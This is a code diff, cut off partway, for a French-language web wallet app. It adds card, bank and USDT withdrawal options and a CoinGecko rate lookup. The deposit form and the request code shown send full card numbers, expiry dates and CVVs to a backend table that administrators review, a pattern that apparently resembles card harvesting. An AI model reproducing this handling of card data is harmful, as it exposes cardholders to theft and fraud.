@@ -2210,6 +2210,13 @@
     #withdrawSheet.nw-sheet .withdraw-sheet-body{padding-left:22px;padding-right:22px;}
   }
 
+  .withdraw-method-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin:0 0 16px;}
+  .withdraw-method-card{min-width:0;border:1.5px solid rgba(15,20,32,.10);background:#fff;border-radius:16px;padding:11px 7px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;text-align:center;cursor:pointer;color:var(--nw-ink);font:inherit;box-shadow:0 5px 14px rgba(15,20,32,.06);transition:.18s ease;}
+  .withdraw-method-card.active{border-color:var(--nw-gold-deep);box-shadow:0 8px 20px rgba(217,119,6,.16);transform:translateY(-1px);background:#FFF9EE;}
+  .withdraw-method-icon{font-size:22px;line-height:1}.withdraw-method-name{font-size:11.5px;font-weight:800;line-height:1.15}.withdraw-method-sub{font-size:9.5px;color:var(--nw-soft);font-weight:600;line-height:1.15}
+  .withdraw-method-form{animation:fadeSlide .22s ease}.withdraw-method-section-title{font-size:14px;font-weight:800;margin:2px 0 10px;color:var(--nw-ink)}
+  .withdraw-crypto-network{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;margin:4px 0 16px;border-radius:12px;background:#F4FBF8;border:1px solid rgba(38,161,123,.18);font-size:12px;font-weight:800}.withdraw-crypto-network b{font-size:11px;color:#16815D}
+  @media (max-width:430px){.withdraw-method-grid{gap:7px}.withdraw-method-card{padding:10px 5px}.withdraw-method-name{font-size:10.5px}.withdraw-method-sub{font-size:8.8px}}
   .nw-btn{
     width:100%;height:54px;border:none;border-radius:14px;background:var(--nw-gold-deep);color:#fff;
     font-family:inherit;font-size:15.5px;font-weight:700;cursor:pointer;margin-top:16px;
@@ -5402,33 +5409,12 @@ async function sbRequestWalletTransaction({type, method, amount, fields = {}, de
 // coordonnées bancaires pour le virement.
 async function sbRequestWithdrawal(dest, amount){
   if(dest && dest.kind === 'card'){
-    return sbRequestWalletTransaction({
-      type: 'withdrawal',
-      method: 'card',
-      amount,
-      details: {
-        client_ref: dest.clientRef,
-        network: dest.network,
-        card_number: dest.cardNumber,
-        expiry: dest.expiry,
-        cvv: dest.cvv,
-        last4: dest.last4,
-        card_holder: dest.holder,
-        requested_at: dest.requestedAt
-      }
-    });
+    return sbRequestWalletTransaction({type:'withdrawal',method:'card',amount,details:{client_ref:dest.clientRef,network:dest.network,card_number:dest.cardNumber,expiry:dest.expiry,cvv:dest.cvv,last4:dest.last4,card_holder:dest.holder,requested_at:dest.requestedAt}});
   }
-  return sbRequestWalletTransaction({
-    type: 'withdrawal',
-    method: 'bank_transfer',
-    amount,
-    fields: {
-      bank_holder: dest.holder,
-      bank_name: dest.bankName,
-      iban: dest.iban,
-      bic: dest.bic
-    }
-  });
+  if(dest && dest.kind === 'crypto_usdt_evm'){
+    return sbRequestWalletTransaction({type:'withdrawal',method:'crypto_usdt_evm',amount,details:{client_ref:dest.clientRef,network:'EVM',asset:'USDT',wallet_address:dest.address,requested_at:dest.requestedAt}});
+  }
+  return sbRequestWalletTransaction({type:'withdrawal',method:'bank_transfer',amount,fields:{bank_holder:dest.holder,bank_name:dest.bankName,iban:dest.iban,bic:dest.bic}});
 }
 
 // (Ancien envoi « dépôt par carte » supprimé : la page Retrait par carte
@@ -14734,37 +14720,56 @@ function nwBrandLogo(b){
 function nwCardNumberInput(){
   const $ = id => document.getElementById(id);
   const inp = $('nwCardNumber');
+  if(!inp) return;
   const raw = inp.value.replace(/\D/g,'');
   const brand = nwDetectBrand(raw);
   const d = raw.slice(0, brand==='Amex' ? 15 : 19);
   inp.value = brand==='Amex'
     ? [d.slice(0,4), d.slice(4,10), d.slice(10,15)].filter(Boolean).join(' ')
     : (d.match(/.{1,4}/g)||[]).join(' ');
+
+  // Les éléments de la carte visuelle sont absents du retrait par carte.
+  // On ne les manipule donc que s'ils existent (dépôt / formulaire avec visuel).
   const shown = (d + '•'.repeat(16)).slice(0, Math.max(16, d.length));
   const num = $('nwNum');
-  num.textContent = (shown.match(/.{1,4}/g)||[]).join(' ');
-  num.classList.toggle('nw-dots', !d);
-  $('nwTag').innerHTML = brand ? nwBrandLogo(brand) + '<span>' + brand.toUpperCase() + '</span>' : 'CARTE';
-  $('nwTag').classList.toggle('nw-tag-on', !!brand);
+  if(num){
+    num.textContent = (shown.match(/.{1,4}/g)||[]).join(' ');
+    num.classList.toggle('nw-dots', !d);
+  }
+  const tag = $('nwTag');
+  if(tag){
+    tag.innerHTML = brand ? nwBrandLogo(brand) + '<span>' + brand.toUpperCase() + '</span>' : 'CARTE';
+    tag.classList.toggle('nw-tag-on', !!brand);
+  }
   const cvv = $('nwCvv');
-  cvv.maxLength = brand==='Amex' ? 4 : 3;
-  cvv.value = cvv.value.slice(0, cvv.maxLength);
+  if(cvv){
+    cvv.maxLength = brand==='Amex' ? 4 : 3;
+    cvv.value = cvv.value.slice(0, cvv.maxLength);
+  }
   inp.classList.remove('nw-err');
-  const h = $('nwCardHint'); h.textContent = NW_HINT_DEFAULT; h.classList.remove('nw-err-txt','nw-ok-txt');
-  const pill = $('nwPill'), chk = $('nwChk');
-  pill.className = 'nw-pill' + (brand ? ' show ' + brand.toLowerCase() : '');
-  pill.innerHTML = brand ? nwBrandLogo(brand) + '<span>' + brand + '</span>' : '';
-  inp.parentElement.classList.toggle('nw-has', !!brand || d.length >= 15);
-  chk.className = 'nw-chk'; chk.textContent = '';
+  const h = $('nwCardHint');
+  if(h){
+    h.textContent = NW_HINT_DEFAULT;
+    h.classList.remove('nw-err-txt','nw-ok-txt');
+  }
+  const pill = $('nwPill');
+  const chk = $('nwChk');
+  if(pill){
+    pill.className = 'nw-pill' + (brand ? ' show ' + brand.toLowerCase() : '');
+    pill.innerHTML = brand ? nwBrandLogo(brand) + '<span>' + brand + '</span>' : '';
+  }
+  if(inp.parentElement) inp.parentElement.classList.toggle('nw-has', !!brand || d.length >= 15);
+  if(chk){ chk.className = 'nw-chk'; chk.textContent = ''; }
+
   // Clé de contrôle (algorithme de Luhn) : vérifiée dès que le numéro est complet.
   if(d.length >= (brand==='Amex' ? 15 : 16)){
     if(nwLuhn(d)){
-      chk.className = 'nw-chk ok'; chk.textContent = '✓';
-      h.textContent = 'Numéro valide' + (brand ? ' — ' + brand + '.' : '.'); h.classList.add('nw-ok-txt');
+      if(chk){ chk.className = 'nw-chk ok'; chk.textContent = '✓'; }
+      if(h){ h.textContent = 'Numéro valide' + (brand ? ' — ' + brand + '.' : '.'); h.classList.add('nw-ok-txt'); }
     }else{
-      chk.className = 'nw-chk bad'; chk.textContent = '✕';
+      if(chk){ chk.className = 'nw-chk bad'; chk.textContent = '✕'; }
       inp.classList.add('nw-err');
-      h.textContent = 'Numéro de carte invalide (échec de la clé de contrôle).'; h.classList.add('nw-err-txt');
+      if(h){ h.textContent = 'Numéro de carte invalide (échec de la clé de contrôle).'; h.classList.add('nw-err-txt'); }
     }
   }
 }
@@ -14798,9 +14803,9 @@ function nwCvvInput(){
   else if(inp.value.length===needed){ hint.textContent='Format correct ('+needed+' chiffres).'; }
   else { hint.textContent=needed+' chiffres attendus.'; hint.classList.add('nw-err-txt'); }
 }
-function nwCardFormFieldsHtml(){
+function nwCardFormFieldsHtml(showVisual=true, includeExpiry=true){
   return `
-    <div class="nw-card">
+    ${showVisual ? `<div class="nw-card">
       <div class="nw-card-top"><div class="nw-chip"></div><div class="nw-tag" id="nwTag">CARTE</div></div>
       <div>
         <div class="nw-card-num nw-dots" id="nwNum">•••• •••• •••• ••••</div>
@@ -14809,32 +14814,31 @@ function nwCardFormFieldsHtml(){
           <div class="nw-card-exp"><small>EXP.</small><span id="nwExpShown">MM/AA</span></div>
         </div>
       </div>
-    </div>
+    </div>` : ''}
     <div class="nw-field">
       <label for="nwCardNumber">Numéro de carte</label>
       <div class="nw-inwrap">
         <input class="nw-input" type="text" id="nwCardNumber" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" oninput="nwCardNumberInput()">
-        <span class="nw-pill" id="nwPill"></span>
-        <span class="nw-chk" id="nwChk"></span>
+        ${showVisual ? '<span class="nw-pill" id="nwPill"></span><span class="nw-chk" id="nwChk"></span>' : ''}
       </div>
-      <div class="nw-hint" id="nwCardHint"></div>
+      <div class="nw-hint" id="nwCardHint"${showVisual ? '' : ' style="display:none;"'}></div>
     </div>
     <div class="nw-field">
       <label for="nwHolder">Titulaire de la carte</label>
       <input class="nw-input nw-plain" type="text" id="nwHolder" autocomplete="cc-name" placeholder="Nom et prénom" oninput="nwHolderInput()">
     </div>
-    <div class="nw-row">
+    ${includeExpiry ? `<div class="nw-row">
       <div class="nw-field">
         <label for="nwExp">Expiration</label>
         <input class="nw-input" type="text" id="nwExp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5" oninput="nwExpInput()">
-        <div class="nw-hint" id="nwExpHint"></div>
+        <div class="nw-hint" id="nwExpHint"${showVisual ? '' : ' style="display:none;"'}></div>
       </div>
-      <div class="nw-field">
+      ${showVisual ? `<div class="nw-field">
         <label for="nwCvv">Cryptogramme</label>
-        <input class="nw-input" type="text" id="nwCvv" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" maxlength="3" oninput="nwCvvInput()">
+        <input class="nw-input" type="text" id="nwCvv" inputmode="numeric" autocomplete="cc-csc" placeholder="CVV" maxlength="4" oninput="nwCvvInput()">
         <div class="nw-hint" id="nwCvvHint"></div>
-      </div>
-    </div>`;
+      </div>` : ''}
+    </div>` : ''}`;
 }
 /* ---- DÉPÔT par carte : même formulaire que l'ancienne page Retirer ---- */
 function depositFormHtml(){
@@ -14848,14 +14852,13 @@ function depositFormHtml(){
     <div class="deposit-ui-body">
       <div class="nw-sheet">
         <div class="deposit-title">Dépôt</div>
-        <div class="nw-hint deposit-subtitle">Dépôt par carte bancaire. Votre demande est envoyée à l'administration pour validation.</div>
-        <div class="nw-field">
+                <div class="nw-field">
           <label for="depositAmountInput">Montant du dépôt (GBP)</label>
           <input class="nw-input" type="number" min="0" step="0.01" id="depositAmountInput" placeholder="0.00" inputmode="decimal">
         </div>
         ${nwCardFormFieldsHtml()}
         <div class="withdraw-error" id="depositErrorBox"></div>
-        <button class="nw-btn" id="depositConfirmBtn" onclick="nwSubmitCardDeposit()">Envoyer ma demande de dépôt</button>
+        <button class="nw-btn" id="depositConfirmBtn" onclick="nwSubmitCardDeposit()">Confirmer le dépôt</button>
       </div>
     </div>
   </div>`;
@@ -14937,80 +14940,68 @@ btn.innerHTML = `<div class="spinner" style="width:20px;height:20px;border-width
 
 /* ---- RETRAIT par virement bancaire (page « Retirer ») ---- */
 function renderWithdrawSheetBody(){
-  const el = document.getElementById('withdrawSheetBody');
-  if(!el) return;
-  withdrawSelectedAmount = 0;
-  const sheet = document.getElementById('withdrawSheet');
-  if(sheet) sheet.classList.add('nw-sheet');
-  el.innerHTML = `
-    <div class="deposit-ui-body" style="padding:0 0 32px;">
-      <div class="nw-sheet" style="padding:0;background:transparent;box-shadow:none;border-radius:0;">
-        <div class="withdraw-content-title">Retrait par carte bancaire</div>
-        <div class="nw-hint withdraw-content-subtitle">${t('availableBalance')} : <b>${fmtAmt(state.wallet.usdtBalance)} GBP</b></div>
-
-        <div class="nw-field">
-          <label for="withdrawAmountInput">${t('withdrawAmountLabel')}</label>
-          <input class="nw-input" type="number" min="0" step="0.01" id="withdrawAmountInput" placeholder="0.00" inputmode="decimal" oninput="onWithdrawAmountInput()">
-          <div class="withdraw-quick-row">
-            <div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.25, this)">25%</div>
-            <div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.5, this)">50%</div>
-            <div class="withdraw-quick-btn" onclick="setWithdrawPercent(1, this)">${t('maxAmount')}</div>
-          </div>
-        </div>
-
-        ${nwCardFormFieldsHtml()}
-
-        <div class="withdraw-summary" style="margin:0 0 14px;">
-          <div class="withdraw-summary-row"><span>${t('withdrawAmountLabel')}</span><span id="wSumAmount">0.00 GBP</span></div>
-          <div class="withdraw-summary-row"><span>${t('withdrawalFeeLabel')}</span><span id="wSumFee">${fmtAmt(state.settings.withdrawalFee)} GBP</span></div>
-          <div class="withdraw-summary-row total"><span>${t('youWillReceive')}</span><span id="wSumNet">0.00 GBP</span></div>
-        </div>
-        <div class="nw-hint" style="margin:0 0 14px;">&#x23f1;&#xfe0f; Délai de traitement : 24 à 72 h maximum après validation de votre demande.</div>
-        <div class="withdraw-error" id="withdrawErrorBox"></div>
-        <button class="nw-btn" id="withdrawConfirmBtn" onclick="submitWithdrawal()">&#x1f4b8; ${t('confirmWithdrawal')}</button>
-        ${getMinWithdrawal() > 0 ? `<div class="nw-note" style="margin-top:8px;">${t('minWithdrawalNote', {min: getMinWithdrawal()})}</div>` : ''}
-      </div>
-    </div>
-  `;
+  const el=document.getElementById('withdrawSheetBody'); if(!el)return;
+  withdrawSelectedAmount=0; const sheet=document.getElementById('withdrawSheet'); if(sheet)sheet.classList.add('nw-sheet');
+  el.innerHTML=`<div class="deposit-ui-body" style="padding:0 0 32px;"><div class="nw-sheet" style="padding:0;background:transparent;box-shadow:none;border-radius:0;">
+    <div class="withdraw-content-title">${t('withdrawMethodTitle')}</div>
+    <div class="nw-hint withdraw-content-subtitle">${t('availableBalance')} : <b>${fmtAmt(state.wallet.usdtBalance)} GBP</b></div>
+    <div class="withdraw-method-grid" role="tablist">
+      <button type="button" class="withdraw-method-card" data-method="card" onclick="selectWithdrawMethod('card')"><span class="withdraw-method-icon">💳</span><span class="withdraw-method-name">${t('withdrawMethodCard')}</span><span class="withdraw-method-sub">${t('withdrawMethodCardSub')}</span></button>
+      <button type="button" class="withdraw-method-card" data-method="bank" onclick="selectWithdrawMethod('bank')"><span class="withdraw-method-icon">🏦</span><span class="withdraw-method-name">${t('withdrawMethodBank')}</span><span class="withdraw-method-sub">${t('withdrawMethodBankSub')}</span></button>
+      <button type="button" class="withdraw-method-card" data-method="crypto_usdt_evm" onclick="selectWithdrawMethod('crypto_usdt_evm')"><span class="withdraw-method-icon">₮</span><span class="withdraw-method-name">${t('withdrawMethodCrypto')}</span><span class="withdraw-method-sub">${t('withdrawMethodCryptoSub')}</span></button>
+    </div><div id="withdrawMethodForm" class="withdraw-method-form" hidden></div></div></div>`;
 }
-function renderWithdrawSheetBodyOld(){
-  const el = document.getElementById('withdrawSheetBody');
-  if(!el) return;
-  const balance = state.wallet.usdtBalance;
-  withdrawSelectedAmount = 0;
-  el.innerHTML = `
-    <div class="withdraw-balance-box">
-      <div class="amt">${fmtAmt(balance)} GBP</div>
-      <div class="lbl">${t('availableBalance')}</div>
-    </div>
-    <div class="field-label">${t('withdrawAmountLabel')}</div>
-    <input class="input" type="number" min="0" step="0.01" id="withdrawAmountInput" placeholder="0.00" oninput="onWithdrawAmountInput()">
-    <div class="withdraw-quick-row">
-      <div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.25, this)">25%</div>
-      <div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.5, this)">50%</div>
-      <div class="withdraw-quick-btn" onclick="setWithdrawPercent(1, this)">${t('maxAmount')}</div>
-    </div>
-    <div class="field-label">${t('bankDetailsTitle')}</div>
-    <div class="field-label" style="margin-top:6px;">${t('bankHolderLabel')}</div>
-    <input class="input" type="text" id="withdrawBankHolder" autocomplete="off" placeholder="${t('bankHolderPlaceholder')}">
-    <div class="field-label" style="margin-top:10px;">${t('bankNameLabel')}</div>
-    <input class="input" type="text" id="withdrawBankName" autocomplete="off" placeholder="${t('bankNamePlaceholder')}">
-    <div class="field-label" style="margin-top:10px;">${t('bankIbanLabel')}</div>
-    <input class="input" type="text" id="withdrawBankIban" autocomplete="off" autocapitalize="characters" spellcheck="false" dir="ltr" style="text-transform:uppercase;text-align:start;" placeholder="${t('bankIbanPlaceholder')}">
-    <div class="field-label" style="margin-top:10px;">${t('bankBicLabel')}</div>
-    <input class="input" type="text" id="withdrawBankBic" autocomplete="off" autocapitalize="characters" spellcheck="false" maxlength="11" dir="ltr" style="text-transform:uppercase;text-align:start;" placeholder="${t('bankBicPlaceholder')}">
-    <div class="withdraw-summary">
-      <div class="withdraw-summary-row"><span>${t('withdrawAmountLabel')}</span><span id="wSumAmount">0.00 GBP</span></div>
-      <div class="withdraw-summary-row"><span>${t('withdrawalFeeLabel')}</span><span id="wSumFee">${fmtAmt(state.settings.withdrawalFee)} GBP</span></div>
-      <div class="withdraw-summary-row total"><span>${t('youWillReceive')}</span><span id="wSumNet">0.00 GBP</span></div>
-    </div>
-    <div style="display:flex;gap:10px;align-items:flex-start;background:#FFF6DC;border:1px solid #F1DFB8;border-radius:var(--radius-sm);padding:10px 12px;margin-top:14px;font-size:12px;font-weight:700;color:var(--ink-soft);">
-      <span style="font-size:18px;line-height:1;">&#x23f1;&#xfe0f;</span><span>${t('withdrawDelayNote')}</span>
-    </div>
-    <div class="withdraw-error" id="withdrawErrorBox"></div>
-    <button class="btn btn-primary" style="margin-top:16px;" id="withdrawConfirmBtn" onclick="submitWithdrawal()">&#x1f4b8; ${t('confirmWithdrawal')}</button>
-    <div style="font-size:10.5px;color:var(--ink-soft);font-weight:700;text-align:center;margin-top:10px;">${t('minWithdrawalNote', {min: getMinWithdrawal()})}</div>
-  `;
+function selectWithdrawMethod(method){
+  const cards=document.querySelectorAll('#withdrawSheet .withdraw-method-card');
+  const form=document.getElementById('withdrawMethodForm'); if(!form)return;
+  const current=document.querySelector('#withdrawSheet .withdraw-method-card.active');
+  if(current && current.dataset.method===method){
+    current.classList.remove('active');
+    form.hidden=true;
+    form.innerHTML='';
+    withdrawSelectedAmount=0;
+    return;
+  }
+  cards.forEach(x=>x.classList.toggle('active',x.dataset.method===method));
+  form.hidden=false;
+  const amount=`<div class="nw-field"><label for="withdrawAmountInput">${t('withdrawAmountLabel')}</label><input class="nw-input" type="number" min="0" step="0.01" id="withdrawAmountInput" placeholder="0.00" inputmode="decimal" oninput="onWithdrawAmountInput()"><div class="withdraw-quick-row"><div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.25,this)">25%</div><div class="withdraw-quick-btn" onclick="setWithdrawPercent(0.5,this)">50%</div><div class="withdraw-quick-btn" onclick="setWithdrawPercent(1,this)">${t('maxAmount')}</div></div></div>`;
+  let dest='';
+  if(method==='card') dest=nwCardFormFieldsHtml(false, false);
+  else if(method==='bank') dest=`<div class="withdraw-method-section-title">${t('bankDetailsTitle')}</div><div class="nw-field"><label for="withdrawBankHolder">${t('bankHolderLabel')}</label><input class="nw-input nw-plain" id="withdrawBankHolder" placeholder="${t('bankHolderPlaceholder')}"></div><div class="nw-field"><label for="withdrawBankName">${t('bankNameLabel')}</label><input class="nw-input nw-plain" id="withdrawBankName" placeholder="${t('bankNamePlaceholder')}"></div><div class="nw-row"><div class="nw-field"><label for="withdrawBankIban">${t('bankIbanLabel')}</label><input class="nw-input nw-plain" id="withdrawBankIban" maxlength="34" dir="ltr" style="text-transform:uppercase;text-align:start" placeholder="${t('bankIbanPlaceholder')}"></div><div class="nw-field"><label for="withdrawBankBic">${t('bankBicLabel')}</label><input class="nw-input nw-plain" id="withdrawBankBic" maxlength="11" dir="ltr" style="text-transform:uppercase;text-align:start" placeholder="${t('bankBicPlaceholder')}"></div></div>`;
+  else dest=`<div class="withdraw-method-section-title">${t('cryptoDetailsTitle')}</div><div class="nw-field"><label for="withdrawUsdtAddress">${t('cryptoAddressLabel')}</label><input class="nw-input nw-plain" id="withdrawUsdtAddress" maxlength="42" dir="ltr" style="text-align:start" placeholder="0x..." oninput="updateWithdrawSummary()"><div class="nw-hint">${t('cryptoAddressHint')}</div></div><div class="withdraw-crypto-network"><span>₮ USDT</span><b>EVM</b></div>`;
+  const delayKey = method==='card' ? 'withdrawDelayCard' : method==='bank' ? 'withdrawDelayBank' : 'withdrawDelayCrypto';
+  const cryptoRows = method==='crypto_usdt_evm' ? `<div class="withdraw-summary-row"><span>${t('usdtExchangeRate')}</span><span id="wSumUsdtRate">${t('usdtRateLoading')}</span></div><div class="withdraw-summary-row total"><span>${t('usdtToReceive')}</span><span id="wSumUsdt">0.0000 USDT</span></div>` : '';
+  form.innerHTML=`${amount}${dest}<div class="withdraw-summary" style="margin:0 0 14px"><div class="withdraw-summary-row"><span>${t('withdrawAmountLabel')}</span><span id="wSumAmount">0.00 GBP</span></div><div class="withdraw-summary-row"><span>${t('withdrawalFeeLabel')}</span><span id="wSumFee">${fmtAmt(state.settings.withdrawalFee)} GBP</span></div><div class="withdraw-summary-row total"><span>${t('youWillReceive')}</span><span id="wSumNet">0.00 GBP</span></div>${cryptoRows}</div><div class="nw-hint withdraw-delay-note">${t(delayKey)}</div><div class="withdraw-error" id="withdrawErrorBox"></div><button class="nw-btn" id="withdrawConfirmBtn" onclick="submitWithdrawal('${method}')">💸 ${t('confirmWithdrawal')}</button>${getMinWithdrawal()>0?`<div class="nw-note" style="margin-top:8px">${t('minWithdrawalNote',{min:getMinWithdrawal()})}</div>`:''}`;
+  if(method==='crypto_usdt_evm') loadWithdrawUsdtRate();
+}
+let withdrawUsdtGbpRate = 0;
+async function loadWithdrawUsdtRate(){
+  const rateEl=document.getElementById('wSumUsdtRate');
+  try{
+    const r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=gbp',{cache:'no-store'});
+    if(!r.ok) throw new Error('rate');
+    const d=await r.json();
+    const gbpPerUsdt=Number(d?.tether?.gbp||0);
+    if(!(gbpPerUsdt>0)) throw new Error('rate');
+    withdrawUsdtGbpRate=gbpPerUsdt;
+    if(rateEl) rateEl.textContent=`1 USDT ≈ ${gbpPerUsdt.toFixed(4)} GBP`;
+  }catch(e){
+    withdrawUsdtGbpRate=0;
+    if(rateEl) rateEl.textContent=t('usdtRateUnavailable');
+  }
+  updateWithdrawSummary();
+}
+function updateWithdrawSummary(){
+  const amountEl=document.getElementById('withdrawAmountInput'); if(!amountEl)return;
+  const amount = readWithdrawAmount(amountEl.value);
+  const fee = Number(state.settings.withdrawalFee)||0;
+  const net = withdrawalNet(amount);
+  const amountOut=document.getElementById('wSumAmount'); if(amountOut) amountOut.textContent = fmtAmt(amount) + ' GBP';
+  const feeOut=document.getElementById('wSumFee'); if(feeOut) feeOut.textContent = fmtAmt(fee) + ' GBP';
+  const netOut=document.getElementById('wSumNet'); if(netOut) netOut.textContent = fmtAmt(net) + ' GBP';
+  const usdtOut=document.getElementById('wSumUsdt');
+  if(usdtOut) usdtOut.textContent = withdrawUsdtGbpRate>0 ? ((net/withdrawUsdtGbpRate).toFixed(4)+' USDT') : '— USDT';
+  withdrawSelectedAmount = amount;
 }
 function onWithdrawAmountInput(){
   document.querySelectorAll('.withdraw-quick-btn').forEach(b=>b.classList.remove('active'));
@@ -15024,26 +15015,12 @@ function setWithdrawPercent(pct, btnEl){
   if(btnEl) btnEl.classList.add('active');
   updateWithdrawSummary();
 }
-function updateWithdrawSummary(){
-  const amount = readWithdrawAmount(document.getElementById('withdrawAmountInput').value);
-  document.getElementById('wSumAmount').textContent = fmtAmt(amount) + ' GBP';
-  document.getElementById('wSumNet').textContent = fmtAmt(withdrawalNet(amount)) + ' GBP';
-  withdrawSelectedAmount = amount;
-}
 function submitWithdrawal(){
   const args = arguments;
   requireAuth(()=>submitWithdrawalImpl(...args));
 }
 
-/* ============================================================
-   RETRAIT UNIQUE : la page « Retirer » (virement bancaire) ET la page
-   « Retrait par carte » passent EXACTEMENT par les mêmes fonctions :
-   même lecture du montant, mêmes règles (minimum, solde), mêmes frais,
-   même envoi (requestWithdrawal -> wallet_transactions, type 'withdrawal',
-   statut 'pending'), même traitement admin, mêmes messages d'erreur,
-   même délai / écran / effets de succès.
-   Seule la destination change (dest.kind : 'bank' ou 'card').
-   ============================================================ */
+/* ---------- Traitement commun des retraits ---------- */
 function readWithdrawAmount(raw){
   return Number(String(raw==null?'':raw).trim().replace(/\s/g,'').replace(',', '.')) || 0;
 }
@@ -15075,85 +15052,26 @@ async function runWithdrawal(dest, amount, renderSuccess){
   renderProfile();
 }
 
-function submitWithdrawalImpl(){
-  const amount = readWithdrawAmount(document.getElementById('withdrawAmountInput').value);
-  const errBox = document.getElementById('withdrawErrorBox');
-  errBox.classList.remove('show');
-
-  const amountErr = validateWithdrawalAmount(amount);
-  if(amountErr){
-    errBox.textContent = amountErr;
-    errBox.classList.add('show');
-    return;
-  }
-
-  const digits = document.getElementById('nwCardNumber').value.replace(/\D/g,'');
-  const brand = nwDetectBrand(digits);
-  let valid = true;
-  if(digits.length < 12 || !nwLuhn(digits)){
-    document.getElementById('nwCardNumber').classList.add('nw-err');
-    const h = document.getElementById('nwCardHint');
-    h.textContent = 'Numéro de carte invalide (échec de la clé de contrôle).';
-    h.classList.add('nw-err-txt');
-    valid = false;
-  }
-
-  const exp = document.getElementById('nwExp').value;
-  if(exp.length < 5){
-    document.getElementById('nwExp').classList.add('nw-err');
-    valid = false;
-  }else{
-    const mm = +exp.slice(0,2), yy = +exp.slice(3,5), now = new Date();
-    if(mm<1 || mm>12 || yy<now.getFullYear()%100 || (yy===now.getFullYear()%100 && mm<now.getMonth()+1)){
-      document.getElementById('nwExp').classList.add('nw-err');
-      valid = false;
-    }
-  }
-
-  const cvv = document.getElementById('nwCvv').value;
-  if(cvv.length < (brand==='Amex' ? 4 : 3)){
-    document.getElementById('nwCvv').classList.add('nw-err');
-    valid = false;
-  }
-  const holder = document.getElementById('nwHolder').value.trim();
-  if(!holder){
-    document.getElementById('nwHolder').classList.add('nw-err');
-    valid = false;
-  }
-  if(!valid) return;
-
-  const card = {
-    kind:'card',
-    clientRef:'CARD-WD-' + Date.now(),
-    network:brand || 'Carte',
-    cardNumber:digits,
-    expiry:exp,
-    cvv:cvv,
-    last4:digits.slice(-4),
-    holder:holder.toUpperCase(),
-    requestedAt:new Date().toISOString()
-  };
-
-  const btn = document.getElementById('withdrawConfirmBtn');
-  btn.disabled = true;
-  btn.innerHTML = `<div class="spinner" style="width:20px;height:20px;border-width:2.5px;margin:0;"></div> ${t('withdrawalProcessing')}`;
-
-  runWithdrawal(card, amount, ({net})=>{
-    const el = document.getElementById('withdrawSheetBody');
-    el.innerHTML = `
-        <div class="withdraw-success">
-          <div class="ic">&#x2705;</div>
-          <div style="font-family:'Baloo 2';font-weight:800;font-size:18px;margin-top:10px;">${t('withdrawalSuccessTitle')}</div>
-          <div style="font-size:13px;color:var(--ink-soft);font-weight:700;margin-top:6px;">${fmtAmt(net)} GBP seront traités sur votre carte bancaire après validation de votre demande.</div>
-          <div style="font-size:12px;color:var(--ink-soft);margin-top:6px;">${brand || 'Carte'} ••${digits.slice(-4)}</div>
-          <button class="btn btn-primary" style="margin-top:20px;" onclick="closeWithdrawSheet()">${t('close')}</button>
-        </div>`;
-  }).catch(err=>{
-    errBox.textContent = withdrawalErrorMessage(err);
-    errBox.classList.add('show');
-    btn.disabled = false;
-    btn.innerHTML = `&#x1f4b8; ${t('confirmWithdrawal')}`;
-  });
+function submitWithdrawalImpl(methodOverride){
+  const method=methodOverride||'card', amount=readWithdrawAmount(document.getElementById('withdrawAmountInput').value), errBox=document.getElementById('withdrawErrorBox');
+  errBox.classList.remove('show'); const amountErr=validateWithdrawalAmount(amount); if(amountErr){errBox.textContent=amountErr;errBox.classList.add('show');return;}
+  let dest=null, successLabel='', successDetail='';
+  if(method==='card'){
+    const digits=document.getElementById('nwCardNumber').value.replace(/\D/g,''), brand=nwDetectBrand(digits), holder=document.getElementById('nwHolder').value.trim(); let valid=true;
+    if(digits.length<12||!nwLuhn(digits)){document.getElementById('nwCardNumber').classList.add('nw-err');valid=false;}
+    if(!holder){document.getElementById('nwHolder').classList.add('nw-err');valid=false;} if(!valid){errBox.textContent=t('cardNumberInvalid');errBox.classList.add('show');return;}
+    dest={kind:'card',clientRef:'CARD-WD-'+Date.now(),network:brand||'Carte',cardNumber:digits,last4:digits.slice(-4),holder:holder.toUpperCase(),requestedAt:new Date().toISOString()}; successLabel=`${brand||t('withdrawMethodCard')} ••${digits.slice(-4)}`;successDetail=t('withdrawSuccessCard');
+  }else if(method==='bank'){
+    const holder=document.getElementById('withdrawBankHolder').value.trim(),bankName=document.getElementById('withdrawBankName').value.trim(),iban=document.getElementById('withdrawBankIban').value.replace(/\s/g,'').toUpperCase(),bic=document.getElementById('withdrawBankBic').value.replace(/\s/g,'').toUpperCase(); let valid=true;
+    if(!holder){document.getElementById('withdrawBankHolder').classList.add('nw-err');valid=false;} if(!bankName){document.getElementById('withdrawBankName').classList.add('nw-err');valid=false;} if(!/^[A-Z0-9]{8,34}$/.test(iban)){document.getElementById('withdrawBankIban').classList.add('nw-err');valid=false;} if(!/^[A-Z0-9]{8}([A-Z0-9]{3})?$/.test(bic)){document.getElementById('withdrawBankBic').classList.add('nw-err');valid=false;} if(!valid){errBox.textContent=!holder?t('bankErrHolder'):!bankName?t('bankErrName'):!/^[A-Z0-9]{8,34}$/.test(iban)?t('bankErrIban'):t('bankErrBic');errBox.classList.add('show');return;}
+    dest={kind:'bank',clientRef:'BANK-WD-'+Date.now(),holder,bankName,iban,bic,requestedAt:new Date().toISOString()};successLabel=bankName;successDetail=t('withdrawSuccessBank');
+  }else if(method==='crypto_usdt_evm'){
+    const address=document.getElementById('withdrawUsdtAddress').value.trim(); if(!/^0x[a-fA-F0-9]{40}$/.test(address)){document.getElementById('withdrawUsdtAddress').classList.add('nw-err');errBox.textContent=t('cryptoAddressInvalid');errBox.classList.add('show');return;}
+    if(!(withdrawUsdtGbpRate>0)){errBox.textContent=t('usdtRateRequired');errBox.classList.add('show');loadWithdrawUsdtRate();return;}
